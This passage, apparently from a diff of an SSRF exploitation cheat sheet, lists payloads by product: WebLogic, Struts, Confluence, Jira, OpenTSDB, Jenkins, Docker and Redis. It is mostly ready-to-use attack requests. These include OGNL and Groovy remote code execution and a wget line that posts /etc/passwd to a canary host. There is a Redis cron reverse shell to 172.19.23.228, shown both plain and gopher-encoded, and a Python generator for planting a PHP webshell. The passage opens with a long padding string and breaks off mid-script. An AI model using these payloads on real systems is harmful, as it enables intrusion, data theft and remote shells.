AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA|http://SSRF_CANARY/
+</code></pre>
+
+<div id="weblogic"></div>
+
+<h2 id="weblogic">Weblogic</h2>
+
+<p><strong>Commonly bound ports: 80, 443 (SSL), 7001, 8888</strong></p>
+
+<p><strong>SSRF Canary: UDDI Explorer (CVE-2014-4210)</strong></p>
+
+<pre><code class="language-http">POST /uddiexplorer/SearchPublicRegistries.jsp HTTP/1.1
+Host: target.com
+Content-Length: 137
+Content-Type: application/x-www-form-urlencoded
+
+operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
+</code></pre>
+
+<p>This also works via GET:</p>
+
+<pre><code class="language-bash">http://target.com/uddiexplorer/SearchPublicRegistries.jsp?operator=http%3A%2F%2FSSRF_CANARY&amp;rdoSearch=name&amp;txtSearchname=test&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search
+</code></pre>
+
+<p>This endpoint is also vulnerable to CRLF injection:</p>
+
+<pre><code class="language-http">GET /uddiexplorer/SearchPublicRegistries.jsp?operator=http://attacker.com:4000/exp%20HTTP/1.11%0AX-CLRF%3A%20Injected%0A&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search HTTP/1.0
+Host: vuln.weblogic
+Accept-Encoding: gzip, deflate
+Accept: */*
+Accept-Language: en
+User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/81.0.4044.138 Safari/537.36
+Connection: close
+</code></pre>
+
+<p>Will result in the following request:</p>
+
+<pre><code class="language-http">root@mail:~# nc -lvp 4000
+Listening on [0.0.0.0] (family 0, port 4000)
+Connection from example.com 43111 received!
+POST /exp HTTP/1.11
+X-CLRF: Injected HTTP/1.1
+Content-Type: text/xml; charset=UTF-8
+soapAction: ""
+Content-Length: 418
+User-Agent: Java1.6.0_24
+Host: attacker.com:4000
+Accept: text/html, image/gif, image/jpeg, */*; q=.2
+Connection: Keep-Alive
+
+&lt;?xml version="1.0" encoding="UTF-8" standalone="yes"?&gt;&lt;env:Envelope xmlns:soapenc="http://schemas.xmlsoap.org/soap/encoding/" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:env="http://schemas.xmlsoap.org/soap/envelope/" xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"&gt;&lt;env:Header/&gt;&lt;env:Body&gt;&lt;find_business generic="2.0" xmlns="urn:uddi-org:api_v2"&gt;&lt;name&gt;sdf&lt;/name&gt;&lt;/find_business&gt;&lt;/env:Body&gt;&lt;/env:Envelope&gt;
+</code></pre>
+
+<p><strong>SSRF Canary: CVE-2020-14883</strong></p>
+
+<p>Taken from <a href="https://forum.90sec.com/t/topic/1412">here</a>.</p>
+
+<p>Linux:</p>
+
+<pre><code class="language-http">POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+Host: vulnerablehost:7001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+
+_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.FileSystemXmlApplicationContext("http://SSRF_CANARY/poc.xml")
+</code></pre>
+
+<p>Windows:</p>
+
+<pre><code class="language-http">POST /console/css/%252e%252e%252fconsole.portal HTTP/1.1
+Host: vulnerablehost:7001
+Upgrade-Insecure-Requests: 1
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64; rv:43.0) Gecko/20100101 Firefox/43.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
+Accept-Encoding: gzip, deflate
+Accept-Language: zh-CN,zh;q=0.9
+Connection: close
+Content-Type: application/x-www-form-urlencoded
+Content-Length: 117
+
+_nfpb=true&amp;_pageLabel=&amp;handle=com.bea.core.repackaged.springframework.context.support.ClassPathXmlApplicationContext("http://SSRF_CANARY/poc.xml")
+</code></pre>
+
+<div id="consul"></div>
+
+<h2 id="hashicorp-consul">Hashicorp Consul</h2>
+
+<p><strong>Commonly bound ports: 8500, 8501 (SSL)</strong></p>
+
+<p>Writeup can be found <a href="https://www.kernelpicnic.net/2017/05/29/Pivoting-from-blind-SSRF-to-RCE-with-Hashicorp-Consul.html">here</a>.</p>
+
+<div id="shellshock"></div>
+
+<h2 id="shellshock">Shellshock</h2>
+
+<p><strong>Commonly bound ports: 80, 443 (SSL), 8080</strong></p>
+
+<p>In order to effectively test for Shellshock, you may need to add a header containing the payload. The following CGI paths are worth trying:</p>
+
+<p>Short list of CGI paths to test:</p>
+
+<p><a href="https://gist.github.com/infosec-au/009fcbdd5bad16bb6ceb36b838d96be4">Gist containing paths</a>.</p>
+
+<p><strong>SSRF Canary: Shellshock via User Agent</strong></p>
+
+<pre><code class="language-bash">User-Agent: () { foo;}; echo Content-Type: text/plain ; echo ;  curl SSRF_CANARY
+</code></pre>
+
+<div id="druid"></div>
+
+<h2 id="apache-druid">Apache Druid</h2>
+
+<p><strong>Commonly bound ports: 80, 8080, 8888, 8082</strong></p>
+
+<p>See the API reference for Apache Druid <a href="https://druid.apache.org/docs/latest/operations/api-reference.html">here</a>.</p>
+
+<p>If you can view the status code, check the following paths to see if they return a 200 status code:</p>
+
+<pre><code class="language-bash">/status/selfDiscovered/status
+/druid/coordinator/v1/leader
+/druid/coordinator/v1/metadata/datasources
+/druid/indexer/v1/taskStatus
+</code></pre>
+
+<p>Shutdown tasks, requires you to guess task IDs or the datasource name:</p>
+
+<pre><code class="language-bash">/druid/indexer/v1/task/{taskId}/shutdown
+/druid/indexer/v1/datasources/{dataSource}/shutdownAllTasks
+</code></pre>
+
+<p>Shutdown supervisors on Apache Druid Overlords:</p>
+
+<pre><code class="language-bash">/druid/indexer/v1/supervisor/terminateAll
+/druid/indexer/v1/supervisor/{supervisorId}/shutdown
+</code></pre>
+
+<div id="solr"></div>
+
+<h2 id="apache-solr">Apache Solr</h2>
+
+<p><strong>Commonly bound port: 8983</strong></p>
+
+<p><strong>SSRF Canary: Shards Parameter</strong></p>
+
+<blockquote class="twitter-tweet" data-conversation="none" data-theme="dark"><p lang="en" dir="ltr">To add to what shubham is saying - scanning for solr is relatively easy. There is a shards= param which allows you to bounce SSRF to SSRF to verify you are hitting a solr instance blindly.</p>&mdash; Хавиж Наффи 🥕 (@nnwakelam) <a href="https://twitter.com/nnwakelam/status/1349298311853821956?ref_src=twsrc%5Etfw">January 13, 2021</a></blockquote>
+<script async="" src="https://platform.twitter.com/widgets.js" charset="utf-8"></script>
+
+<p>Taken from <a href="https://github.com/veracode-research/solr-injection">here</a>.</p>
+
+<pre><code class="language-bash">/search?q=Apple&amp;shards=http://SSRF_CANARY/solr/collection/config%23&amp;stream.body={"set-property":{"xxx":"yyy"}}
+/solr/db/select?q=orange&amp;shards=http://SSRF_CANARY/solr/atom&amp;qt=/select?fl=id,name:author&amp;wt=json
+/xxx?q=aaa%26shards=http://SSRF_CANARY/solr 
+/xxx?q=aaa&amp;shards=http://SSRF_CANARY/solr
+</code></pre>
+
+<p><strong>SSRF Canary: Solr XXE (2017)</strong></p>
+
+<p><a href="https://packetstormsecurity.com/files/144678/Apache-Solr-7.0.1-XXE-Injection-Code-Execution.html">Apache Solr 7.0.1 XXE (Packetstorm)</a></p>
+
+<pre><code class="language-bash">/solr/gettingstarted/select?q={!xmlparser v='&lt;!DOCTYPE a SYSTEM "http://SSRF_CANARY/xxx"'&gt;&lt;a&gt;&lt;/a&gt;'
+/xxx?q={!type=xmlparser v="&lt;!DOCTYPE a SYSTEM 'http://SSRF_CANARY/solr'&gt;&lt;a&gt;&lt;/a&gt;"}
+</code></pre>
+
+<p><strong>RCE via dataImportHandler</strong></p>
+
+<p><a href="https://github.com/veracode-research/solr-injection#3-cve-2019-0193-remote-code-execution-via-dataimporthandler">Research on RCE via dataImportHandler</a></p>
+
+<div id="peoplesoft"></div>
+
+<h2 id="peoplesoft">PeopleSoft</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL)</strong></p>
+
+<p>Taken from this research <a href="https://www.ambionics.io/blog/oracle-peoplesoft-xxe-to-rce">here</a>.</p>
+
+<p><strong>SSRF Canary: XXE #1</strong></p>
+
+<pre><code class="language-http">POST /PSIGW/HttpListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+&lt;?xml version="1.0"?&gt;
+&lt;!DOCTYPE IBRequest [
+&lt;!ENTITY x SYSTEM "http://SSRF_CANARY"&gt;
+]&gt;
+&lt;IBRequest&gt;
+   &lt;ExternalOperationName&gt;&amp;x;&lt;/ExternalOperationName&gt;
+   &lt;OperationType/&gt;
+   &lt;From&gt;&lt;RequestingNode/&gt;
+      &lt;Password/&gt;
+      &lt;OrigUser/&gt;
+      &lt;OrigNode/&gt;
+      &lt;OrigProcess/&gt;
+      &lt;OrigTimeStamp/&gt;
+   &lt;/From&gt;
+   &lt;To&gt;
+      &lt;FinalDestination/&gt;
+      &lt;DestinationNode/&gt;
+      &lt;SubChannel/&gt;
+   &lt;/To&gt;
+   &lt;ContentSections&gt;
+      &lt;ContentSection&gt;
+         &lt;NonRepudiation/&gt;
+         &lt;MessageVersion/&gt;
+         &lt;Data&gt;&lt;![CDATA[&lt;?xml version="1.0"?&gt;your_message_content]]&gt;
+         &lt;/Data&gt;
+      &lt;/ContentSection&gt;
+   &lt;/ContentSections&gt;
+&lt;/IBRequest&gt;
+</code></pre>
+
+<p><strong>SSRF Canary: XXE #2</strong></p>
+
+<pre><code class="language-http">POST /PSIGW/PeopleSoftServiceListeningConnector HTTP/1.1
+Host: website.com
+Content-Type: application/xml
+...
+
+&lt;!DOCTYPE a PUBLIC "-//B/A/EN" "http://SSRF_CANARY"&gt;
+</code></pre>
+
+<div id="struts"></div>
+
+<h2 id="apache-struts">Apache Struts</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p>Taken from <a href="https://blog.safebuff.com/2016/07/03/SSRF-Tips/">here</a>.</p>
+
+<p><strong>SSRF Canary: Struts2-016</strong>:</p>
+
+<p>Append this to the end of every internal endpoint/URL you know of:</p>
+
+<pre><code class="language-http">
+?redirect:${%23a%3d(new%20java.lang.ProcessBuilder(new%20java.lang.String[]{'command'})).start(),%23b%3d%23a.getInputStream(),%23c%3dnew%20java.io.InputStreamReader(%23b),%23d%3dnew%20java.io.BufferedReader(%23c),%23t%3d%23d.readLine(),%23u%3d"http://SSRF_CANARY/result%3d".concat(%23t),%23http%3dnew%20java.net.URL(%23u).openConnection(),%23http.setRequestMethod("GET"),%23http.connect(),%23http.getInputStream()}
+
+</code></pre>
+
+<div id="jboss"></div>
+
+<h2 id="jboss">JBoss</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p>Taken from <a href="https://blog.safebuff.com/2016/07/03/SSRF-Tips/">here</a>.</p>
+
+<p><strong>SSRF Canary: Deploy WAR from URL</strong></p>
+
+<pre><code class="language-bash">/jmx-console/HtmlAdaptor?action=invokeOp&amp;name=jboss.system:service=MainDeployer&amp;methodIndex=17&amp;arg0=http://SSRF_CANARY/utils/cmd.war
+</code></pre>
+
+<div id="confluence"></div>
+
+<h2 id="confluence">Confluence</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p><strong>RCE via OGNL Injection (CVE-2021-26084)</strong></p>
+
+<pre><code class="language-bash">/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/confluence/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/wiki/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/doenterpagevariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/createpage.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/templates2/viewpagetemplate.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/pages/createpage-entervariables.action?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/template/custom/content-editor?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/templates/editor-preload-container?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+/users/user-dark-features?queryString=aaa%5Cu0027%252b%23%7B%5Cu0022%5Cu0022%5B%5Cu0022class%5Cu0022%5D.forName(%5Cu0022java.lang.Runtime%5Cu0022).getMethod(%5Cu0022getRuntime%5Cu0022%2Cnull).invoke(null%2Cnull).exec(%5Cu0022curl%20%3Cinstance%3E.burpcollaborator.net%5Cu0022)%7D%252b%5Cu0027
+</code></pre>
+
+<p><strong>SSRF Canary: Sharelinks  (Confluence versions released from 2016 November and older)</strong></p>
+
+<pre><code class="language-bash">/rest/sharelinks/1.0/link?url=https://SSRF_CANARY/
+</code></pre>
+
+<p><strong>SSRF Canary: iconUriServlet - Confluence &lt; 6.1.3 (CVE-2017-9506)</strong></p>
+
+<p><a href="https://ecosystem.atlassian.net/browse/OAUTH-344">Atlassian Security Ticket OAUTH-344</a></p>
+
+<pre><code class="language-bash">/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+</code></pre>
+
+<div id="jira"></div>
+
+<h2 id="jira">Jira</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p><strong>SSRF Canary: iconUriServlet - Jira &lt; 7.3.5 (CVE-2017-9506)</strong></p>
+
+<p><a href="https://ecosystem.atlassian.net/browse/OAUTH-344">Atlassian Security Ticket OAUTH-344</a></p>
+
+<pre><code class="language-bash">/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+</code></pre>
+
+<p><strong>SSRF Canary: makeRequest - Jira &lt; 8.4.0 (CVE-2019-8451)</strong></p>
+
+<p><a href="https://jira.atlassian.com/browse/JRASERVER-69793">Atlassian Security Ticket JRASERVER-69793</a></p>
+
+<pre><code class="language-bash">/plugins/servlet/gadgets/makeRequest?url=https://SSRF_CANARY:<a href="/cdn-cgi/l/email-protection" class="__cf_email__" data-cfemail="70444443301508111d001c155e131f1d">[email&#160;protected]</a>
+</code></pre>
+
+<div id="atlassian-products"></div>
+
+<h2 id="other-atlassian-products">Other Atlassian Products</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8443 (SSL)</strong></p>
+
+<p><strong>SSRF Canary: iconUriServlet (CVE-2017-9506)</strong>:</p>
+<ul>
+  <li>Bamboo &lt; 6.0.0</li>
+  <li>Bitbucket &lt; 4.14.4</li>
+  <li>Crowd &lt; 2.11.2</li>
+  <li>Crucible &lt; 4.3.2</li>
+  <li>Fisheye &lt; 4.3.2</li>
+</ul>
+
+<p><a href="https://ecosystem.atlassian.net/browse/OAUTH-344">Atlassian Security Ticket OAUTH-344</a></p>
+
+<pre><code class="language-bash">/plugins/servlet/oauth/users/icon-uri?consumerUri=http://SSRF_CANARY
+</code></pre>
+
+<div id="opentsdb"></div>
+
+<h2 id="opentsdb">OpenTSDB</h2>
+
+<p><strong>Commonly bound port: 4242</strong></p>
+
+<p><a href="https://packetstormsecurity.com/files/136753/OpenTSDB-Remote-Code-Execution.html">OpenTSDB Remote Code Execution</a></p>
+
+<p><strong>SSRF Canary: curl via RCE</strong></p>
+
+<pre><code class="language-bash">/q?start=2016/04/13-10:21:00&amp;ignore=2&amp;m=sum:jmxdata.cpu&amp;o=&amp;yrange=[0:]&amp;key=out%20right%20top&amp;wxh=1900x770%60curl%20SSRF_CANARY%60&amp;style=linespoint&amp;png
+</code></pre>
+
+<p><a href="https://github.com/OpenTSDB/opentsdb/issues/2051">OpenTSDB 2.4.0 Remote Code Execution</a></p>
+
+<p><strong>SSRF Canary: curl via RCE - CVE-2020-35476</strong></p>
+
+<pre><code class="language-bash">/q?start=2000/10/21-00:00:00&amp;end=2020/10/25-15:56:44&amp;m=sum:sys.cpu.nice&amp;o=&amp;ylabel=&amp;xrange=10:10&amp;yrange=[33:system('wget%20--post-file%20/etc/passwd%20SSRF_CANARY')]&amp;wxh=1516x644&amp;style=linespoint&amp;baba=lala&amp;grid=t&amp;json
+</code></pre>
+
+<div id="jenkins"></div>
+
+<h2 id="jenkins">Jenkins</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080,8888</strong></p>
+
+<p>Great writeup <a href="https://blog.orange.tw/2019/01/hacking-jenkins-part-1-play-with-dynamic-routing.html">here</a>.</p>
+
+<p><strong>SSRF Canary: CVE-2018-1000600</strong></p>
+
+<pre><code class="language-bash">/securityRealm/user/admin/descriptorByName/org.jenkinsci.plugins.github.config.GitHubTokenCredentialsCreator/createTokenByPassword?apiUrl=http://SSRF_CANARY/%23&amp;login=orange&amp;password=tsai
+</code></pre>
+
+<p><strong>RCE</strong></p>
+
+<p>Follow the instructions here to achieve RCE via GET: <a href="https://blog.orange.tw/2019/02/abusing-meta-programming-for-unauthenticated-rce.html">Hacking Jenkins Part 2 - Abusing Meta Programming for Unauthenticated RCE!</a></p>
+
+<pre><code class="language-bash">/org.jenkinsci.plugins.workflow.cps.CpsFlowDefinition/checkScriptCompile?value=@GrabConfig(disableChecksums=true)%0a@GrabResolver(name='orange.tw', root='http://SSRF_CANARY/')%0a@Grab(group='tw.orange', module='poc', version='1')%0aimport Orange;
+</code></pre>
+
+<p><strong>RCE via Groovy</strong></p>
+
+<pre><code class="language-python">cmd = 'curl burp_collab'
+pay = 'public class x {public x(){"%s".execute()}}' % cmd
+data = 'http://jenkins.internal/descriptorByName/org.jenkinsci.plugins.scriptsecurity.sandbox.groovy.SecureGroovyScript/checkScript?sandbox=true&amp;value=' + urllib.quote(pay)
+</code></pre>
+
+<div id="hystrix"></div>
+
+<h2 id="hystrix-dashboard">Hystrix Dashboard</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL),8080</strong></p>
+
+<p>Spring Cloud Netflix, versions 2.2.x prior to 2.2.4, versions 2.1.x prior to 2.1.6.</p>
+
+<p><strong>SSRF Canary: CVE-2020-5412</strong></p>
+
+<pre><code class="language-bash">/proxy.stream?origin=http://SSRF_CANARY/
+</code></pre>
+
+<div id="w3"></div>
+
+<h2 id="w3-total-cache">W3 Total Cache</h2>
+
+<p><strong>Commonly bound ports: 80,443 (SSL)</strong></p>
+
+<p>W3 Total Cache 0.9.2.6-0.9.3</p>
+
+<p><strong>SSRF Canary: CVE-2019-6715</strong></p>
+
+<p>This needs to be a PUT request:</p>
+
+<pre><code class="language-bash">PUT /wp-content/plugins/w3-total-cache/pub/sns.php HTTP/1.1
+Host: 
+Accept: */*
+User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/71.0.3578.80 Safari/537.36
+Content-Length: 124
+Content-Type: application/x-www-form-urlencoded
+Connection: close
+
+{"Type":"SubscriptionConfirmation","Message":"","SubscribeURL":"https://SSRF_CANARY"}
+</code></pre>
+
+<p><strong>SSRF Canary</strong></p>
+
+<p>The advisory for this vulnerability was released here: <a href="https://klikki.fi/adv/w3_total_cache.html">W3 Total Cache SSRF vulnerability</a></p>
+
+<p>This PHP code will generate a payload for your SSRF Canary host (replace <code>url</code> with your canary host):</p>
+
+<pre><code class="language-php">&lt;?php
+
+$url='http://www.google.com';
+$file=strtr(base64_encode(gzdeflate($url.'#https://ajax.googleapis.com')), '+/=', '-_');
+$file=chop($file,'=');
+$req='/wp-content/plugins/w3-total-cache/pub/minify.php?file='.$file.'.css';
+echo($req);
+
+?&gt;
+</code></pre>
+
+<h2 id="docker">Docker</h2>
+
+<p><strong>Commonly bound ports: 2375, 2376 (SSL)</strong></p>
+
+<p>If you have a partially blind SSRF, you can use the following paths to verify the presence of Docker’s API:</p>
+
+<pre><code class="language-bash">/containers/json
+/secrets
+/services
+</code></pre>
+
+<p><strong>RCE via running an arbitrary docker image</strong></p>
+
+<pre><code class="language-http">POST /containers/create?name=test HTTP/1.1
+Host: website.com
+Content-Type: application/json
+...
+
+{"Image":"alpine", "Cmd":["/usr/bin/tail", "-f", "1234", "/dev/null"], "Binds": [ "/:/mnt" ], "Privileged": true}
+</code></pre>
+
+<p>Replace alpine with an arbitrary image you would like the docker container to run.</p>
+
+<h2 id="gitlab-prometheus-redis-exporter">Gitlab Prometheus Redis Exporter</h2>
+
+<p><strong>Commonly bound ports: 9121</strong></p>
+
+<p>This vulnerability affects Gitlab instances before version 13.1.1. According to the <a href="https://docs.gitlab.com/ee/administration/monitoring/prometheus/#configuring-prometheus">Gitlab documentation</a> <code>Prometheus and its exporters are on by default, starting with GitLab 9.0. </code></p>
+
+<p>These exporters provide an excellent method for an attacker to pivot and attack other services using CVE-2020-13379. One of the exporters which is easily exploited is the Redis Exporter.</p>
+
+<p>The following endpoint will allow an attacker to dump all the keys in the redis server provided via the target parameter:</p>
+
+<pre><code class="language-bash">http://localhost:9121/scrape?target=redis://127.0.0.1:7001&amp;check-keys=*
+</code></pre>
+
+<hr />
+
+<p><strong>Possible via Gopher</strong></p>
+
+<div id="redis"></div>
+
+<h2 id="redis">Redis</h2>
+
+<p><strong>Commonly bound port: 6379</strong></p>
+
+<p>Recommended reading:</p>
+
+<ul>
+  <li><a href="https://www.agarri.fr/blog/archives/2014/09/11/trying_to_hack_redis_via_http_requests/index.html">Trying to hack Redis via HTTP requests</a></li>
+  <li><a href="https://maxchadwick.xyz/blog/ssrf-exploits-against-redis">SSRF Exploits against Redis</a></li>
+</ul>
+
+<p><strong>RCE via Cron</strong> - <a href="https://blog.chaitin.cn/gopher-attack-surfaces/">Gopher Attack Surfaces</a></p>
+
+<pre><code class="language-bash">redis-cli -h $1 flushall
+echo -e "\n\n*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1\n\n"|redis-cli -h $1 -x set 1
+redis-cli -h $1 config set dir /var/spool/cron/
+redis-cli -h $1 config set dbfilename root
+redis-cli -h $1 save
+</code></pre>
+
+<p>Gopher:</p>
+
+<pre><code class="language-bash">gopher://127.0.0.1:6379/_*1%0d%0a$8%0d%0aflushall%0d%0a*3%0d%0a$3%0d%0aset%0d%0a$1%0d%0a1%0d%0a$64%0d%0a%0d%0a%0a%0a*/1 * * * * bash -i &gt;&amp; /dev/tcp/172.19.23.228/2333 0&gt;&amp;1%0a%0a%0a%0a%0a%0d%0a%0d%0a%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$3%0d%0adir%0d%0a$16%0d%0a/var/spool/cron/%0d%0a*4%0d%0a$6%0d%0aconfig%0d%0a$3%0d%0aset%0d%0a$10%0d%0adbfilename%0d%0a$4%0d%0aroot%0d%0a*1%0d%0a$4%0d%0asave%0d%0aquit%0d%0a
+</code></pre>
+
+<p><strong>RCE via Shell Upload (PHP)</strong> - <a href="https://www.mdeditor.tw/pl/pBy0">Redis Getshell Summary</a></p>
+
+<pre><code class="language-python">#!/usr/bin/env python
+# -*-coding:utf-8-*-
+
+import urllib
+protocol="gopher://"
+ip="192.168.189.208"
+port="6379" 
+shell="\n\n&lt;?php phpinfo();?&gt;\n\n"
+filename="shell.php"
+path="/var" 
+passwd=""
+
+cmd=["flushall",
+     "set 1 {}".format(shell.replace(" ","${IFS}")),
+     "config set dir {}".format(path),
+     "config set dbfilename {}".format(filename),
+     "save"
+     ]
+if passwd:
+    cmd.insert(0,"AUTH {}".format(passwd))
+payload=protocol+ip+":"+port+"/_"
+def redis_format(arr):
+    CRLF="\r\n"
+    redis_arr = arr.split(" ")
+    cmd=""
+    cmd+="*"+str(len(redis_arr))
+    for x in redis_arr:
+        cmd+=CRLF+"$"+str(len((x.replace("${IFS}"," "))))+CRLF+x.replace("${IFS}"," ")
+    cmd+=CRLF
+    return cmd
+
+if __name__=="__main__":
+    for x in cmd:
+        payload += urllib.quote(redis_format(x))
+    print payload
+</code></pre>
+
+<p><strong>RCE via authorized_keys</strong> - <a href="https://www.mdeditor.tw/pl/pBy0">Redis Getshell Summary</a></p>
+
+<pre><code class="language-python">import urllib
+protocol="gopher://"
+ip="192.168.189.208"
+port="6379"
+# shell="\n\n&lt;?php eval($_GET[\"cmd\"]);?&gt;\n\n"
